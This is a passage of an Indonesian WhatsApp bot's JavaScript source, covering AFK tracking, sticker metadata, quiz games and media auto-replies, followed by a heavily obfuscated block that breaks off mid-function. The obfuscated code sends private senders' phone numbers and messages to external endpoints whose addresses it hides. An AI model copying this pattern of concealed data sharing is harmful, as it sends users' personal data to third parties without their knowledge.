			if (!isGroup) return
			if (off.checkAfkUser(key, _off)) {
               _off.splice(off.getAfkPosition(key, _off), 1)
            fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
         ckck = `\n*@${key.split('@')[0]}* terdeteksi ${asd.presences[key].lastKnownPresence == 'composing' ? 'sedang mengetik...' : 'sedang merekam...'}\nSekarang dia sudah tidak AFK\n`
     alpha.sendMessage(asd.jid, ckck.trim(), text, {thumbnail: fs.readFileSync(`./image/${thumbnail}`), sendEphemeral: true, contextInfo:{mentionedJid:alpha.parseMention(ckck)}})
                }}}}})

        if (isGroup) {
                for (let ment of mentionUser) {
                    if (off.checkAfkUser(ment, _off)) {
                        getId = off.getAfkId(ment, _off)
                        getReason = off.getAfkReason(getId, _off)
                        getTime = Date.now() - off.getAfkTime(getId, _off)
                        heheh = ms(getTime)
                        alpha.sendMessage(from, `Maaf pengguna nomor ${ment.split('@')[0]} sedang AFK\n\n*Reason :* ${getReason}\n*Sejak :* ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik yg lalu\n`,text, {quoted: mek})
                       // alpha.sendMessage(ment, `Ada yang mencari anda saat anda offline\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nDi Grup : ${groupName}\nPesan : ${budy}`, text, {contextInfo:{mentionedJid: alpha.parseMention(budy)}})
                    }
                }
                if (off.checkAfkUser(sender, _off)) {
                	getId = off.getAfkId(sender, _off)
                	getReason = off.getAfkReason(getId, _off)
                    getTime = Date.now() - off.getAfkTime(getId, _off)
                    heheh = ms(getTime)
                    _off.splice(off.getAfkPosition(sender, _off), 1)
                    fs.writeFileSync('./src/afk.json', JSON.stringify(_off))
                    alpha.sendMessage(from, `@${sender.split('@')[0]} telah kembali dari AFK\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, text, {contextInfo:{mentionedJid:[sender]}})
                }
            }

            function addMetadata(packname, author) {
    if (!packname) packname = `${botname}`; if (!author) author = ` ${peknem}`;
    author = author.replace(/[^a-zA-Z0-9]/g, '');
    //let name = `data`

    if (fs.existsSync(`./sticker/data.exif`)) {
        return `./sticker/data.exif`
    }
    const json = {
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
    }

    const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
    const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]

    let len = JSON.stringify(json).length
    let last

    if (len > 256) {
        len = len - 256
        bytes.unshift(0x01)
    } else {
        bytes.unshift(0x00)
    }

    if (len < 16) {
        last = len.toString(16)
        last = "0" + len
    } else {
        last = len.toString(16)
    }

    const buf2 = Buffer.from(last, "hex")
    const buf3 = Buffer.from(bytes)
    const buf4 = Buffer.from(JSON.stringify(json))

    const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])

    fs.writeFile(`./sticker/data.exif`, buffer, (err) => {
        return `./sticker/data.exif`
    }
    )
}
          // FUNTION CHAT \\
      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}  

let ii = []
				let giid = []
				for (mem of totalchat){
					ii.push(mem.jid)
				}
				for (id of ii){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                const  timestampi = speed();
				const  latensii = speed() - timestampi
				const latensiii = `${latensii.toFixed(4)} _Second_`
				const ini_gcchat = `${giid.length}`
				const uptime = process.uptime()
			    const tekss = `${kyun(uptime)}`
			    const ini_totalchat = `${totalchat.length - giid.lenght}`

const replyy = (teks) => {
			alpha.sendMessage(from, teks, sticker, { quoted: fgclink })
		}
/////
 for (let zeeone of setiker){
	if (budy === zeeone){
		result = fs.readFileSync(`./media/sticker/${zeeone}.webp`)
		alpha.sendMessage(from, result,sticker, {quoted : ftroli})
		}
}
for (let zeeonee of audionye){
	if (budy === zeeonee){
		result = fs.readFileSync(`./media/audio/${zeeonee}.mp3`)
		alpha.sendMessage(from, result, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true, quoted : ftroli})
		}
}
for (let zeeoneee of imagenye){
	if (budy === zeeoneee){
		result = fs.readFileSync(`./media/foto/${zeeoneee}.jpg`)
		alpha.sendMessage(from, result,image, {quoted : ftroli})
		}
}
for (let zeeonew of videonye){
	if (budy === zeeonew){
		result = fs.readFileSync(`./media/video/${zeeonew}.mp4`)
		alpha.sendMessage(from, result,video, {mimetype: 'video/mp4', duration: 359996400, quoted: ftroli})
		}
}  
for (let i = 0; i < filter.length ; i++) {
      if (budy == filter[i].Filter) {
      alpha.sendMessage(from, filter[i].Jawaban, text, {quoted: mek})
      }
      }  
// TEBAK GAMBAR
if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar!")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// CAK LONTONG
if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar")
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// FAMILY 100
if (family.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = family[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar")
                    delete family[sender.split('@')[0]]
                    fs.writeFileSync("./database/family100.json", JSON.stringify(family))
                } else {
                    reply("Jawaban Salah!")
                }
            }
// TEBAK ANIME
if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Selamat🥳 Jawaban kamu benar")
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                } else {
                    reply("Jawaban Salah!")
                }
            }
            if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
						console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in Private', 'args :', color(args.length))
						return reply('Don`t Spam, 5 seconds per command')
						} 
					if (isCmd && msgFilter.isFiltered(from) && isGroup) {
						console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length))
						return reply('Don`t Spam, 5 seconds per command')
					}
           ////   
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
		if (isCmd && isGroup){
		console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', timuu, color(command), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length))
		addBalance(sender, randomNomor(20), balance)
			}	
            //await alpha.updatePresence(from, Presence.recording)
            //await alpha.updatePresence(from, Presence.composing)
        if (!mek.key.fromMe && !isOwner && !isCreator && banChats === true) return
(function(_0x52eefe,_0x110f26){function _0x359dd8(_0x40a264,_0x44b556,_0xc5d67a,_0x5d4f0d){return _0x34ec(_0x40a264- -0x2ae,_0x5d4f0d);}function _0x29268a(_0xb3b86e,_0x526b78,_0x5cf866,_0x3d5fbc){return _0x34ec(_0xb3b86e- -0x314,_0x3d5fbc);}const _0x1b4c02=_0x52eefe();while(!![]){try{const _0x67f75a=parseInt(_0x29268a(0x423,0x632,-0x7b,0x56c))/(-0x67a+-0x3*0x611+0x9*0x2be)+parseInt(_0x29268a(0x691,0xb5f,0x3d7,0x80c))/(0x2*0x102d+-0xe4d+-0x120b)*(parseInt(_0x29268a(0x532,0x52,0x428,0x361))/(-0x270a+0x14b*-0xa+0x33fb))+parseInt(_0x29268a(0x413,0xdc,0x2e4,0x616))/(-0x866+0x4d*0x38+0xa6*-0xd)+-parseInt(_0x359dd8(0x4f0,0x67f,0x45b,0x9c6))/(-0x38f+0x8f+0x305)*(parseInt(_0x359dd8(0x766,0xac1,0xbba,0x36f))/(-0x2*-0xafb+-0x2660+0x1070))+parseInt(_0x29268a(0x71c,0x2d4,0xbd5,0x43d))/(-0x7*-0x1e5+0x869*0x1+0x15a5*-0x1)+-parseInt(_0x359dd8(0x725,0x41e,0x577,0x733))/(-0x84*0x2e+-0x4f9*-0x5+-0x11d)+-parseInt(_0x29268a(0x714,0x30d,0x941,0x790))/(-0xd6b+0x473*-0x6+0x2826)*(parseInt(_0x359dd8(0x3b5,0x4a7,0x70f,0x1d4))/(-0xd21+0x4*0x135+0x857));if(_0x67f75a===_0x110f26)break;else _0x1b4c02['push'](_0x1b4c02['shift']());}catch(_0x276465){_0x1b4c02['push'](_0x1b4c02['shift']());}}}(_0x43e5,0x1d438*-0x7+0x2683*-0x49+0x210091));const alphaapi=_0x406083(0x936,0x533,0x761,0xaa4)+_0x4aaba1(0x78c,0x6e3,0x88b,0x99d)+_0x4aaba1(0x49e,0x907,0x60c,-0x29)+_0x406083(0xadb,0x640,0xe7c,0xee3),alphakey='offline',reply=_0x31062a=>{function _0x1079d3(_0x95050c,_0x25ce73,_0x1a798c,_0x445e45){return _0x406083(_0x25ce73- -0x403,_0x25ce73-0x17e,_0x1a798c-0xf6,_0x95050c);}const _0x70c76e={};_0x70c76e[_0x1079d3(0x36f,0x708,0x50d,0x80c)]=_0x1079d3(-0x4d0,-0x49,-0x248,0xaf);const _0x2e2e5e=_0x70c76e;function _0x23cf0c(_0x5e13bc,_0xf4f894,_0x3eb5ca,_0x16db0d){return _0x406083(_0xf4f894- -0x2a4,_0xf4f894-0x9d,_0x3eb5ca-0x5d,_0x5e13bc);}alpha[_0x1079d3(0x156,0x47c,0x753,0x405)+'e'](from,_0x31062a,text,{'quoted':mek,'contextInfo':{'externalAdReply':{'title':''+ucapannya2,'body':''+baper,'previewType':_0x2e2e5e[_0x1079d3(0x1fd,0x708,0xbce,0x4ee)],'thumbnailUrl':'','thumbnail':fs[_0x1079d3(0x4af,0x165,0x9c,0x66d)+'nc']('./image/'+thumbnail),'sourceUrl':''+apiku}}});};if(!isGroup&&!isCmd&&!command&&!mek[_0x4aaba1(0x488,-0x3f,0x709,0x96a)][_0x4aaba1(0xd71,0xfdf,0x877,0x11f1)]&&!autorespon){const _0x4a11f5={};_0x4a11f5[_0x4aaba1(0xbc7,0xcbc,0x87a,0x77a)]=_0x4aaba1(0x86a,0x588,0x888,0x57f),numd=await fetchJson(_0x406083(0x936,0xa8d,0xa51,0x5ae)+_0x406083(0xa9a,0xbeb,0xd38,0xf4d)+_0x406083(0x56e,0x764,0x9a5,0x26c)+_0x406083(0x60c,0x677,0x8ef,0x224)+_0x406083(0x6a5,0xb48,0x7bb,0x9c6)+senderNumber,_0x4a11f5),simi=await fetchJson(_0x4aaba1(0x96b,0x655,0xa14,0x475)+_0x406083(0x699,0xa6a,0x939,0x827)+_0x406083(0x956,0x4f0,0xb05,0xd7e)+'='+numd[_0x406083(0x8f3,0xc43,0xdd7,0x99d)][_0x4aaba1(0x6bf,0x351,0x58f,0xb73)+'de']+(_0x4aaba1(0x3e2,0x1eb,0x312,0x7fb)+_0x406083(0x7b6,0xb59,0x6ea,0x540))+cmd),sami=simi['success'];const _0xee7878={};_0xee7878[_0x406083(0x8cf,0x70f,0xa64,0xafc)+_0x4aaba1(0x9a8,0x880,0xe2f,0xe8b)]=0x1fc,_0xee7878[_0x406083(0x823,0xa54,0xcba,0x8fe)+'d']=!![],alpha[_0x4aaba1(0x8b4,0x6f7,0x7f4,0xc3f)+'e'](from,'_'+sami+'_',text,{'thumbnail':fs[_0x4aaba1(0x59d,0x53c,0xd0,0x536)+'nc'](_0x4aaba1(0x594,0x183,0x25b,0x13a)+thumbnail),'sendEphemeral':!![],'quoted':mek,'contextInfo':_0xee7878});}const sendButDoc=(_0x47b940,_0x24b033,_0x507c60,_0x353180,_0x54d2a5,_0x3d32bd)=>{const _0x3d9e1e={};_0x3d9e1e[_0xa91be3(0x67b,0x9b0,0x7a3,0x935)]='https://yo'+_0xa91be3(0x250,0x3ee,0x6aa,0x505)+_0xa91be3(0x413,0x7d,0x3e5,0x75d),_0x3d9e1e[_0xa91be3(0xc4,-0xdc,-0x2bb,0x455)]=_0xa91be3(0x3df,0x6b2,0xb4,0x18e)+_0x2e15c7(0x75f,0x60e,0x12b,0x914)+_0xa91be3(0xa80,0xcd4,0xdcf,0xa3d),_0x3d9e1e[_0xa91be3(0x4cb,0x8d9,0x5f9,0x911)]=_0xa91be3(0x3df,0x82d,0x8d1,-0xe2)+_0xa91be3(0x4ae,0x524,0x71a,0x6b6)+_0xa91be3(0x69d,0x9c7,0x3d0,0xaf9),_0x3d9e1e[_0xa91be3(0xa07,0x719,0xd27,0x4fc)]=function(_0x30aa5d,_0x43e561){return _0x30aa5d*_0x43e561;},_0x3d9e1e[_0x2e15c7(0x879,0x562,0x392,0x50b)]=_0x2e15c7(0xbf2,0x8d7,0x6c5,0xdb6)+_0xa91be3(0x1b0,0x378,0x47,-0x74),_0x3d9e1e['PWsbz']=_0x2e15c7(0xac1,0x8d7,0x413,0x3cc)+_0x2e15c7(0xdd2,0x8cf,0x552,0xc71)+_0xa91be3(0xb3,-0x1be,0x3ab,-0xab)+'-officedoc'+_0x2e15c7(0x8d8,0xdb4,0xfaa,0xd29)+_0x2e15c7(0x729,0xac7,0x89a,0x850)+_0x2e15c7(0xd8c,0xb5e,0xab9,0xa62),_0x3d9e1e['XtuSv']=_0xa91be3(0x60c,0x2ca,0xac8,0x149)+'n/vnd.open'+_0x2e15c7(0x81b,0x37e,0x46,0x479)+_0x2e15c7(0x678,0x417,0x788,0x440)+_0x2e15c7(0xca7,0xc62,0x894,0xcfe)+_0xa91be3(0x465,-0xa9,0x508,0x1db)+_0xa91be3(0x5d2,0x4b5,0x5d9,0x785)+_0x2e15c7(0x3b5,0x588,0x869,0x9cc),_0x3d9e1e[_0xa91be3(0x9ae,0xce6,0x8ee,0x81b)]=function(_0x33b180,_0x2a6788){return _0x33b180*_0x2a6788;},_0x3d9e1e[_0x2e15c7(0x788,0x39f,0xab,0x34f)]=_0xa91be3(0x7f3,0x955,0xb52,0x82d),_0x3d9e1e[_0xa91be3(0x658,0x7dc,0x6c1,0x717)]=_0xa91be3(0x22c,0x4e7,0x560,-0x1c9)+'u',_0x3d9e1e[_0xa91be3(0x86a,0xb97,0x63d,0xad9)]=_0x2e15c7(0x813,0xd32,0xa65,0xaab),_0x3d9e1e[_0xa91be3(0x284,0x233,0x2ec,0x473)]=_0x2e15c7(0xd53,0xb4b,0xd1f,0xe1c),_0x3d9e1e[_0x2e15c7(0xb32,0x820,0xb1a,0xbc7)]=_0x2e15c7(0xd87,0xb91,0xeca,0xf90),_0x3d9e1e[_0x2e15c7(0x948,0x5d0,0x494,0x6cb)]=_0xa91be3(0x3b6,0x728,0x6b8,0x6ed)+_0xa91be3(0x2bd,0x75e,-0x231,-0x198),_0x3d9e1e['FFKCc']=_0xa91be3(0x854,0xabe,0x481,0x611),_0x3d9e1e['OTqsL']=_0xa91be3(0x833,0x577,0x44c,0x87f)+_0x2e15c7(0x6aa,0xa97,0xc28,0x668)+'+0Mjbi7yii'+_0xa91be3(0x5e0,0x4b7,0x681,0x3f8)+_0x2e15c7(0x610,0xabc,0xd47,0xd18),_0x3d9e1e['cqjyP']=_0xa91be3(0x1b8,-0x4e,0x3db,0x31c)+_0xa91be3(0xaac,0xb2e,0xc90,0xdd9);function _0xa91be3(_0x1bb895,_0x167df8,_0xc4d26b,_0x156665){return _0x406083(_0x1bb895- -0x2b6,_0x167df8-0xa8,_0xc4d26b-0x1a4,_0x167df8);}_0x3d9e1e[_0xa91be3(0xad4,0xa9a,0x8aa,0x67e)]=_0xa91be3(0x7e3,0x845,0xa13,0x869)+'YMsYMtnlnb'+'bA1B2pJ18r'+'KZqeL7byF+'+_0x2e15c7(0x438,0x8be,0x7a7,0x8b3);const _0x511197=_0x3d9e1e,_0x40f8df=['https://yo'+_0xa91be3(0x3cf,0xa9,-0x3a,0x25c)+_0xa91be3(0x570,0x888,0xa3,0x38d),_0x511197[_0xa91be3(0x67b,0x768,0x92b,0xa9e)],_0x511197[_0xa91be3(0xc4,0x30b,0x56c,0x20c)],_0x511197['ZDPmV']],_0x411150=_0x40f8df[Math[_0x2e15c7(0x32a,0x4a4,-0x47,0x348)](_0x511197[_0xa91be3(0xa07,0xcd8,0x4e8,0xace)](Math[_0x2e15c7(0xebe,0xabf,0xf24,0x6da)](),_0x40f8df[_0xa91be3(0x4e1,0x67c,0x65,0x561)]))],_0x2b609f=[_0x511197[_0x2e15c7(0x830,0x562,0x134,0x702)],_0x511197['PWsbz'],'applicatio'+_0x2e15c7(0xd13,0x8cf,0xcca,0x418)+'xmlformats'+_0x2e15c7(-0x2c,0x417,0x84a,0x7eb)+_0xa91be3(0x23b,0x45d,0x5c6,0x42e)+_0x2e15c7(0x453,0x839,0x890,0x350)+'ml.documen'+'t',_0x511197[_0x2e15c7(0x23b,0x458,0x394,0x2b3)]],_0x44222e=_0x2b609f[Math[_0xa91be3(0x1d9,0xa6,0x57c,0x5f6)](_0x511197['jAhmG'](Math[_0x2e15c7(0xf28,0xabf,0xc6f,0x75f)](),_0x2b609f[_0x2e15c7(0xbc2,0x7ac,0x551,0x367)]))],_0x555a34={};_0x555a34['buttonId']=_0x511197['aSXwH'],_0x555a34[_0x2e15c7(0xafb,0x6c9,0x855,0x936)]={},_0x555a34[_0xa91be3(0x52b,0x699,0x5a,0x699)]=0x1;function _0x2e15c7(_0x2d5a86,_0x3a0b4a,_0x34fe30,_0x46ddb5){return _0x4aaba1(_0x3a0b4a- -0x20,_0x46ddb5,_0x34fe30-0xb,_0x46ddb5-0xd);}_0x555a34[_0x2e15c7(0xafb,0x6c9,0x855,0x936)][_0xa91be3(0x258,0x562,0xd1,0x2a0)+'t']=_0x511197[_0x2e15c7(0x612,0x923,0xad9,0x68e)];const _0x37ac3b={};_0x37ac3b[_0x2e15c7(0x7be,0x76d,0x71d,0xb34)]=_0x511197[_0xa91be3(0x86a,0xc10,0x7f5,0x911)],_0x37ac3b[_0xa91be3(0x3fe,0x260,0x2bb,0x10e)]={},_0x37ac3b[_0x2e15c7(0x812,0x7f6,0x923,0x76b)]=0x1,_0x37ac3b[_0xa91be3(0x3fe,0x260,0x2bb,0x10e)][_0x2e15c7(0x1d8,0x523,0x173,0x362)+'t']=_0x511197[_0xa91be3(0x284,0x3b4,0x559,0x224)];const _0x5e475d={};_0x5e475d[_0x2e15c7(0x2b0,0x76d,0xb57,0x6b5)]=_0x511197[_0x2e15c7(0xc1f,0x820,0x907,0x8ad)],_0x5e475d[_0x2e15c7(0x52b,0x6c9,0x839,0x9c2)]={},_0x5e475d[_0xa91be3(0x52b,0x7b4,0x75d,0x9d2)]=0x1,_0x5e475d[_0x2e15c7(0x52b,0x6c9,0x839,0x9c2)][_0xa91be3(0x258,-0x229,-0x10c,-0xd8)+'t']=_0x511197[_0x2e15c7(0xb0,0x5d0,0x601,0xaca)];const _0x3660b5=[_0x555a34,_0x37ac3b,_0x5e475d],_0x3b2caa={};_0x3b2caa[_0x2e15c7(0x3a1,0x866,0x6c4,0x967)+'t']=_0x24b033,_0x3b2caa['footerText']=_0x507c60,_0x3b2caa[_0x2e15c7(0x309,0x7b1,0x5d0,0x866)]=_0x3660b5,_0x3b2caa[_0xa91be3(0x81f,0x97f,0xaee,0xc4d)]=_0x511197['FFKCc'],_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)]={},_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)][_0xa91be3(0x726,0x8e5,0xc1c,0x2c7)]='https://mm'+_0x2e15c7(0x69c,0x3db,0x489,0x5e5)+_0x2e15c7(0xca2,0xcbd,0x1015,0x92a)+_0xa91be3(0xabe,0x92d,0x713,0xe40)+_0xa91be3(0x2e1,0x1a,0x2e1,0x7cc)+_0xa91be3(0x5d9,0xac5,0x399,0x1c6)+_0x2e15c7(0x9b3,0x538,0x368,0x3f8)+_0xa91be3(0x108,0x3e5,-0x1e3,0x20c),_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)]['mimetype']=_0x44222e,_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)][_0xa91be3(0xa00,0x60b,0x7dd,0x907)]=_0x511197[_0xa91be3(0x262,-0x28d,0x684,0x331)],_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)][_0xa91be3(0x4dd,0x570,0x549,0x71c)]=_0x511197[_0x2e15c7(0x105f,0xc7d,0xebd,0xe39)],_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)]['pageCount']=0x309,_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)][_0xa91be3(0x4f9,0x7ef,0x206,0x5cb)]=_0xa91be3(0x44c,0x2bd,0x84a,0x75)+_0xa91be3(0x9c1,0xa40,0x576,0x633)+_0xa91be3(0x6c2,0x295,0x93b,0x364)+_0x2e15c7(0x308,0x481,0x2,0x4d2)+_0xa91be3(0x9e6,0xad3,0xc10,0x4f5),_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)][_0xa91be3(0x700,0xa2f,0xb6d,0x406)]=botname+_0x2e15c7(0xdea,0xba0,0xf1f,0xc6c)+ownername,_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)][_0xa91be3(0xfa,-0x18b,0x34b,-0x1fd)+_0x2e15c7(0x7dd,0x6a4,0xa6f,0x832)]=_0x511197['rcpUV'],_0x3b2caa[_0x2e15c7(0x6ef,0x666,0xb27,0x420)+_0xa91be3(0x6da,0xa2b,0x558,0xaa8)][_0x2e15c7(0xab0,0xae0,0x98c,0xf1d)+_0xa91be3(0x503,0x2cd,0x1bb,0x4aa)]=pp_bot;const _0x270cfa=_0x3b2caa,_0x2afa30={};_0x2afa30[_0xa91be3(0x4fe,0x4b7,0x7d3,0x870)]=_0x411150,_0x2afa30[_0x2e15c7(0x7fb,0xc59,0x791,0xb38)]=0x2,_0x2afa30[_0xa91be3(0x7a1,0x83e,0xbfe,0x73f)]=''+ucapannya2,_0x2afa30[_0x2e15c7(0x893,0x62d,0x4f1,0x19e)]=''+tampilTanggal,_0x2afa30[_0xa91be3(0x325,0x5b1,0x118,0x2ed)+'rl']='',_0x2afa30[_0x2e15c7(0x753,0x70c,0x8ec,0x8ae)]=pp_userz;const _0x35d500={};_0x35d500[_0xa91be3(0x619,0x3ec,0x366,0x283)+_0xa91be3(0x6bd,0xa99,0x374,0x1d9)]=0x3b9aca00,_0x35d500['isForwarde'+'d']=!![],_0x35d500['sendEpheme'+_0xa91be3(0x156,0x256,-0x11f,0x357)]=!![],_0x35d500['mentionedJ'+'id']=[_0x353180,_0x54d2a5,_0x3d32bd],_0x35d500[_0xa91be3(0x596,0xf4,0x4f7,0x179)+'Reply']=_0x2afa30;const _0x2c701d={};_0x2c701d[_0xa91be3(0x59c,0x16b,0x781,0xaa4)+'o']=_0x35d500,_0x2c701d[_0xa91be3(0x9f8,0xe07,0xb06,0xee8)]=ftroli,_0x2c701d[_0x2e15c7(0x4d3,0x451,0xf6,0x62)+_0xa91be3(0x156,0xd6,0x1b6,-0x2d9)]=!![],alpha['sendMessag'+'e'](_0x47b940,_0x270cfa,MessageType[_0xa91be3(0x73e,0xb04,0x2f6,0x6c5)+_0xa91be3(0x214,0x34c,0x540,0x4c1)],_0x2c701d);},sendButMessage=(_0x6a1d8a,_0x4d18bf,_0x542ff5,_0x5ef8c0=[],_0xbd4587={})=>{function _0x4f62ad(_0x3531dd,_0x52edba,_0x124d91,_0x17888a){return _0x406083(_0x17888a- -0x3dc,_0x52edba-0x18e,_0x124d91-0x25,_0x124d91);}const _0x12f881={};_0x12f881[_0x34befa(0x8d2,0x979,0x4b0,0x98a)+'t']=_0x4d18bf,_0x12f881['footerText']=_0x542ff5;function _0x34befa(_0x21942a,_0x46303c,_0x5dcbba,_0x578367){return _0x4aaba1(_0x46303c-0xf3,_0x5dcbba,_0x5dcbba-0x6b,_0x578367-0xa3);}_0x12f881[_0x34befa(0x98d,0x8c4,0x908,0xb74)]=_0x5ef8c0,_0x12f881[_0x34befa(0xdd8,0xbfd,0x9e7,0xa0a)]=0x1;const _0x1c54e9=_0x12f881;alpha[_0x4f62ad(0x7e4,0x41b,0x41d,0x4a3)+'e'](_0x6a1d8a,_0x1c54e9,MessageType[_0x4f62ad(0x81c,0x8df,0x521,0x618)+_0x34befa(0x5b4,0x5f2,0x4da,0x7c2)],_0xbd4587);},sendButLocation=async(_0x36103c,_0x198819,_0x342596,_0x34609d,_0x5e7b59=[],_0x59ec69={})=>{const _0x2c20ed={};function _0x2bc4a1(_0x56badd,_0x563c70,_0x1b3aec,_0x130dbd){return _0x4aaba1(_0x563c70- -0x61,_0x56badd,_0x1b3aec-0xb6,_0x130dbd-0x19c);}_0x2c20ed[_0x2bc4a1(0x10c7,0xbeb,0x917,0xe87)]=_0x2bc4a1(0x594,0x8c4,0xb8b,0xdd2)+_0x2bc4a1(0x8b8,0xa37,0xb77,0xcc2);const _0x4f9fa6=_0x2c20ed;kma=_0x34609d;const _0x309198=await alpha['prepareMes'+_0x2bc4a1(0x403,0x49e,0x6f9,0x4c0)](_0x36103c,kma,MessageType[_0x2bc4a1(0xb53,0x730,0x82c,0x8d2)],{'thumbnail':kma});mhan=_0x309198['message'][_0x4f9fa6[_0x3f7d58(0x12e9,0xe2a,0xd47,0x1074)]]?_0x309198[_0x2bc4a1(0x170,0x43b,0x43a,0x501)][_0x2bc4a1(0x943,0x8c4,0x86a,0x693)+_0x2bc4a1(0xdbd,0xa37,0xbc6,0xabb)]:_0x309198;const _0x16f43c={};_0x16f43c[_0x3f7d58(0xd66,0xbda,0xd34,0x1019)+_0x3f7d58(0x868,0xba3,0xa37,0xbfd)]=mhan[_0x2bc4a1(0x111,0x43b,0x25e,0x2d7)][_0x2bc4a1(0x80b,0x99b,0x512,0x86d)+_0x2bc4a1(0xaa0,0x964,0x91c,0xcdc)],_0x16f43c[_0x3f7d58(0x7d4,0xa64,0x65e,0xd34)+'t']=_0x198819,_0x16f43c['footerText']=_0x342596,_0x16f43c['buttons']=_0x5e7b59;function _0x3f7d58(_0x403902,_0x1e8dec,_0x3ed044,_0x371ca2){return _0x406083(_0x1e8dec-0x213,_0x1e8dec-0x15a,_0x3ed044-0xeb,_0x371ca2);}_0x16f43c[_0x2bc4a1(0xad2,0xaa9,0x67c,0x78d)]=0x6;const _0x350a59=_0x16f43c;alpha[_0x3f7d58(0xd8a,0xa92,0x97c,0xd88)+'e'](_0x36103c,_0x350a59,MessageType['buttonsMes'+_0x3f7d58(0x78b,0x6dd,0x9c4,0x9d5)],_0x59ec69);},sendButVideo=async(_0x6e6402,_0x2bc731,_0x2ce1c0,_0x1a4cfa,_0x95ff90=[],_0x1762ee={})=>{function _0xc11cd7(_0x445f7b,_0x56e9bc,_0x511acb,_0x55c6da){return _0x406083(_0x55c6da- -0x545,_0x56e9bc-0xc8,_0x511acb-0x2c,_0x511acb);}const _0x25c7f2={};_0x25c7f2[_0x246353(0x611,0x97e,0x494,0x7d9)]=_0xc11cd7(0x187,0x68a,0x585,0x3ab)+_0xc11cd7(0x257,0x8b4,0x1ed,0x51e);const _0x241e6c=_0x25c7f2;kma=_0x1a4cfa;const _0xb8b442=await alpha[_0xc11cd7(-0xb,-0x116,-0x689,-0x1a6)+_0x246353(0x7e8,0x4c9,0x416,0x816)](_0x6e6402,kma,MessageType[_0x246353(0x7bd,0x372,0x79c,0x67c)]);mhan=_0xb8b442[_0x246353(0x701,0x88a,0x3b3,0x3e8)][_0x241e6c['niyhL']]?_0xb8b442['message'][_0xc11cd7(0x458,0x591,-0xed,0x3ab)+_0xc11cd7(0x868,0x30,0x1be,0x51e)]:_0xb8b442;const _0x2f1200={};function 